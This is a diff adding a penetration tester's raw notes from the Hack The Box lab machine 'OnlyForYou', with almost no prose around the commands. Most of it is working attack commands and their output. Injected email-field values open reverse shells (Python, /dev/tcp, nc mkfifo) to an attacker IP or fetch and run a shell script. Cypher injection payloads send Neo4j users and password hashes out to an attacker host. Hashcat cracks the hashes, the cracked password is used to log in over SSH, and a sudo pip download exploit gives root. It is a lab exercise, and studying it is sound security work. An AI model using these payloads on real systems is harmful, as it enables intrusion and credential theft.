@@ -1,0 +1,397 @@
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 e883e0a9fd43df38198aaa35438411ec (RSA)
+|   256 83f235229b03860c16cfb3fa9f5acd08 (ECDSA)
+|_  256 445f7aa377690a77789b04e09f11db80 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Did not follow redirect to http://only4you.htb/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 366.64 seconds
+
+
+
+┌──(anhndt㉿Laptop14)-[~/htb/only4you.htb]
+└─$ wfuzz -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.only4you.htb" --hc 403,400,301 -t 50 10.10.11.210
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.210/
+Total requests: 100000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+
+000000087:   200        51 L     145 W      2190 Ch     "beta"
+
+Total time: 194.7621
+Processed Requests: 100000
+Filtered Requests: 99999
+Requests/sec.: 513.4466
+
+
+
+POST /download HTTP/1.1
+Host: beta.only4you.htb
+Content-Length: 38
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://beta.only4you.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://beta.only4you.htb/resize
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+image=/etc/nginx/sites-enabled/default
+
+
+server {
+    listen 80;
+    return 301 http://only4you.htb$request_uri;
+}
+
+server {
+	listen 80;
+	server_name only4you.htb;
+
+	location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/only4you.htb/only4you.sock;
+	}
+}
+
+server {
+	listen 80;
+	server_name beta.only4you.htb;
+
+        location / {
+                include proxy_params;
+                proxy_pass http://unix:/var/www/beta.only4you.htb/beta.sock;
+        }
+}
+
+
+POST /download HTTP/1.1
+Host: beta.only4you.htb
+Content-Length: 35
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://beta.only4you.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://beta.only4you.htb/resize
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+image=/var/www/only4you.htb/form.py
+
+
+import smtplib, re
+from email.message import EmailMessage
+from subprocess import PIPE, run
+import ipaddress
+
+def issecure(email, ip):
+	if not re.match("([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})", email):
+		return 0
+	else:
+		domain = email.split("@", 1)[1]
+		result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)  ==>> command injcetion
+		output = result.stdout.decode('utf-8')
+		if "v=spf1" not in output:
+			return 1
+		else:
+			domains = []
+			ips = []
+			if "include:" in output:
+				dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+				dms.pop(0)
+				for domain in dms:
+					domains.append(domain)
+				while True:
+					for domain in domains:
+						result = run([f"dig txt {domain}"], shell=True, stdout=PIPE)
+						output = result.stdout.decode('utf-8')
+						if "include:" in output:
+							dms = ''.join(re.findall(r"include:.*\.[A-Z|a-z]{2,}", output)).split("include:")
+							domains.clear()
+							for domain in dms:
+								domains.append(domain)
+						elif "ip4:" in output:
+							ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+							ipaddresses.pop(0)
+							for i in ipaddresses:
+								ips.append(i)
+						else:
+							pass
+					break
+			elif "ip4" in output:
+				ipaddresses = ''.join(re.findall(r"ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]{2}", output)).split("ip4:")
+				ipaddresses.pop(0)
+				for i in ipaddresses:
+					ips.append(i)
+			else:
+				return 1
+		for i in ips:
+			if ip == i:
+				return 2
+			elif ipaddress.ip_address(ip) in ipaddress.ip_network(i):
+				return 2
+			else:
+				return 1
+
+def sendmessage(email, subject, message, ip):
+	status = issecure(email, ip)
+	if status == 2:
+		msg = EmailMessage()
+		msg['From'] = f'{email}'
+		msg['To'] = 'info@only4you.htb'
+		msg['Subject'] = f'{subject}'
+		msg['Message'] = f'{message}'
+
+		smtp = smtplib.SMTP(host='localhost', port=25)
+		smtp.send_message(msg)
+		smtp.quit()
+		return status
+	elif status == 1:
+		return status
+	else:
+		return status
+
+
+
+abc@locahost&curl http://10.10.16.49:8000
+
+
+
+
+name=test&email=abc@locahost.compython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.49",7050));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'&subject=test&message=test
+
+
+name=test&email=abc@locahost.com%26python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect(("10.10.16.49",7050))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3bos.dup2(s.fileno(),2)%3bimport+pty%3b+pty.spawn("sh")'&subject=test&message=test
+
+
+dig txt localhost.com&sh \-i \>\& \/dev\/tcp\/10.10.16.49\/7050 0\>\&1
+
+
+localhost.com&sh \-i \>\& \/dev\/tcp\/10.10.16.49\/7050 0\>\&1
+
+abc@localhost.com & sh \-i \>\& \/dev\/tcp\/10.10.16.49\/7050 0\>\&1
+
+name=test&email=abc@localhost.com&curl http://10.10.16.49:8000/nsshell.sh -o /tmp/nsshell.sh&subject=test&message=test
+name=test&email=abc@localhost.com%26curl+http%3a//10.10.16.49%3a8000/nsshell.sh+-o+/tmp/nsshell.sh&subject=test&message=test
+
+name=test&email=abc@localhost.com&chmod 777 /tmp/nsshell.sh&subject=test&message=test
+name=test&email=abc@localhost.com%26chmod+777+/tmp/nsshell.sh&subject=test&message=test
+
+name=test&email=abc@localhost.com&/tmp/nsshell.sh&subject=test&message=test
+name=test&email=abc@localhost.com%26/tmp/nsshell.sh&subject=test&message=test
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
+
+
+find / -type d -perm -o+w
+
+find / -type d -perm -o+w+r
+
+curl http://10.10.16.49:8000/linpeas.sh -o /tmp/test/linpeas.sh
+
+
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: only4you.htb' -H $'Content-Length: 140' -H $'Cache-Control: max-age=0' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: http://only4you.htb' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9' -H $'Referer: http://only4you.htb/?email=test%40test.com' -H $'Accept-Encoding: gzip, deflate' -H $'Accept-Language: en-US,en;q=0.9' -H $'Connection: close' \
+    -b $'session=eyJfZmxhc2hlcyI6W3siIHQiOlsiZGFuZ2VyIiwiWW91IGFyZSBub3QgYXV0aG9yaXplZCEiXX1dfQ.ZHcZ_A.WWNWTbFEyuUImx-wQUacNicTAcw' \
+    --data-binary $'name=test&email=abc@abc.com%26rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.24+7050+>/tmp/f&subject=test&message=test' \
+    $'http://only4you.htb/'
+
+
+curl -i -s -k -X $'POST' \
+    -H $'Host: only4you.htb' -H $'Content-Length: 140' -H $'Content-Type: application/x-www-form-urlencoded' \
+    --data-binary $'name=test&email=abc@abc.com%26rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.24+7050+>/tmp/f&subject=test&message=test' \
+    $'http://only4you.htb/'
+	
+	
+curl -i -s -k -X $'POST' \
+    -H $'Host: only4you.htb' -H $'Content-Length: 140' -H $'Content-Type: application/x-www-form-urlencoded' \
+    --data-binary $'name=test&email=abc@abc.com%26rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.16.54+7050+>/tmp/f&subject=test&message=test' \
+    $'http://only4you.htb/'
+
+
+www-data@only4you:~/only4you.htb$ (netstat -punta || ss --ntpu)
+(netstat -punta || ss --ntpu)
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1030/nginx: worker
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
+tcp        0      1 10.10.11.210:39884      8.8.8.8:53              SYN_SENT    -
+tcp        0    188 10.10.11.210:36966      10.10.16.24:7050        ESTABLISHED 1693/nc
+tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -
+tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+udp        0      0 127.0.0.1:36317         127.0.0.53:53           ESTABLISHED -
+udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
+udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
+
+
+
+www-data@only4you:~/only4you.htb$ curl 127.0.0.1:7474
+{
+  "bolt_routing" : "neo4j://127.0.0.1:7687",
+  "transaction" : "http://127.0.0.1:7474/db/{databaseName}/tx",
+  "bolt_direct" : "bolt://127.0.0.1:7687",
+  "neo4j_version" : "5.6.0",
+  "neo4j_edition" : "community"
+
+
+curl 127.0.0.1:8001/login -d "username=anonymous&password=anonymous"
+
+
+
+chisel client 127.0.0.1 8001
+
+chisel server --port 8001 --proxy 127.0.0.1
+
+
+./chisel64 server -p 60000 --reverse
+
+./chisel64 client 10.10.16.54:60000 R:60001:127.0.0.1:3000
+
+
+./chisel64 server -p 60000 --reverse
+
+./chisel64 client 10.10.16.54:60000 R:8001:127.0.0.1:8001
+
+
+8001=> admin|admin
+
+
+./chisel64 client 10.10.16.54:60000 R:7474:127.0.0.1:7474
+
+./chisel64 client 10.10.16.54:60000 R:3000:127.0.0.1:3000
+
+
+
+
+sqlmap -l /home/kali/stuffs/htb/only4you.htb/searchrq -o --level=5  --risk=3 -b
+
+sqlmap --url 'http://127.0.0.1:8001/search' --data='action=bookingpress_front_get_category_services&_wpnonce=aa95524bbb&category_id=1&total_service=1' --cookie='PHPSESSID=bbh3nao433sisnl9a9lo9am3qm; wordpress_test_cookie=WP%20Cookie%20check' --random-agent -p 'total_service' --dbms=MySQL -o --dump-all --level=5 --risk=3 --proxy=http://192.168.44.1:8080 
+
+
+sqlmap --url 'http://127.0.0.1:8001/search' --data='search=john' --cookie='session=062ce8ad-c62a-4106-8b67-4a542ff3122c' --random-agent -p 'search' --technique='B' --dbms=MySQL -o -b --level=5 --risk=3
+
+
+
+ref:https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j#unicode-injection
+
+
+' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'http://10.10.16.54:8000/?' + name as _l RETURN 1 // 
+
+' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name LOAD CSV FROM 'https://attacker.com/' + name as _l RETURN 1 // 
+
+
+' OR 1=1 WITH 1 as a  CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM 'http://10.10.16.54:8000/?version=' + version + '&name=' + name + '&edition=' + edition as l RETURN 0 as _0 // 
+10.10.11.210 - - [30/Jun/2023 19:42:47] "GET /?version=5.6.0&name=Neo4j Kernel&edition=community HTTP/1.1" 400 -
+
+' OR 1=1 call dbms.listQueries() yield query LOAD CSV FROM 'http://10.10.16.54:8000/?' + query as l RETURN 1 // 
+
+' OR 1=1 call apoc.cypher.runMany("SHOW TRANSACTIONS yield currentQuery RETURN currentQuery",{}) yield result LOAD CSV FROM 'http://10.10.16.54:8000/?' + result['currentQuery'] as l RETURN 1//
+
+' OR 1=1 WITH 1 as a  call apoc.systemdb.graph() yield nodes LOAD CSV FROM 'http://10.10.16.54:8000/?nodes=' + apoc.convert.toJson(nodes) as l RETURN 1 //
+
+' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.54:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+' OR 1=1 CALL apoc.config.list() YIELD key, value LOAD CSV FROM 'http://10.10.16.54:8000/?'+key+"="+" A B C" as l RETURN 1 // 
+
+'}) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.54:8000/?l='+label as l RETURN 0 as _0 
+
+1' OR 1=1 WITH 1 as a  CALL db.labels() yield label LOAD CSV FROM 'http://10.10.16.54:8000/?label='+label as l RETURN 0 as _0 //
+
+10.10.11.210 - - [30/Jun/2023 20:13:27] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:28] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:28] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:28] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:29] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:29] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:30] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:30] "GET /?label=employee HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:30] "GET /?label=user HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:13:31] "GET /?label=employee HTTP/1.1" 200 -
+
+' OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.54:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+10.10.11.210 - - [30/Jun/2023 20:19:50] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:51] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:51] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:52] "GET /?username=john HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:52] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:52] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:53] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:53] "GET /?username=john HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:54] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:54] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:55] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:55] "GET /?username=john HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:55] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:56] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:56] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:57] "GET /?username=john HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:57] "GET /?password=8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:57] "GET /?username=admin HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:58] "GET /?password=a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6 HTTP/1.1" 200 -
+10.10.11.210 - - [30/Jun/2023 20:19:58] "GET /?username=john HTTP/1.1" 200 -
+
+' OR 1=1 WITH 1 as a MATCH (f:employee) UNWIND keys(f) as p LOAD CSV FROM 'http://10.10.16.54:8000/?' + p +'='+toString(f[p]) as l RETURN 0 as _0 //
+
+8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918
+a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6
+
+hashcat -a 3 -m 1400 -w 4 -i /home/kali/stuffs/htb/only4you.htb/hashfile /usr/share/eaphammer/wordlists/rockyou.txt
+
+hashcat -a 3 -m 1400 -w 4 '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918' /usr/share/eaphammer/wordlists/rockyou.txt => admin
+
+hashcat -a 3 -m 1400 -w 4 'a85e870c05825afeac63215d5e845aa7f3088cd15359ea88fa4061c6411c55f6' /usr/share/eaphammer/wordlists/rockyou.txt => ThisIs4You
+
+
+ssh john@10.10.11.210
+ThisIs4You
+
+
+tar -czvf file.tar.gz directory
+
+
+http://127.0.0.1:3000/john/Test/src/master/file.tar.gz
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/file.tar.gz
+
+ref: https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/pip-download-code-execution/
+
+wget 10.10.16.54:8000/this_is_fine_wuzzi-0.0.1.tar.gz
+
+
+sudo /usr/bin/pip3 download http://127.0.0.1:3000/this_is_fine_wuzzi-0.0.1.tar.gz
+
+
+/usr/bin/bash -p
+
+
+
